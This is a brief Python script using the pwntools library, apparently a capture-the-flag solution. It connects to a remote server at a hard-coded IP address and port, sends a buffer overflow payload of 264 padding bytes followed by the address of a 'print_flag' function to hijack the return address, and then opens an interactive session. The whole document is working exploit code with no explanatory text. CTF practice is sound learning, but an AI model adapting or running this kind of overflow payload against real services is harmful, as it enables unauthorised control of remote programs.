from pwn import *

p = remote('54.85.45.101', 8008)

print_flag = 0x401176

payload = b"A" * 264  + p64(print_flag)  

p.sendline(payload)
p.interactive()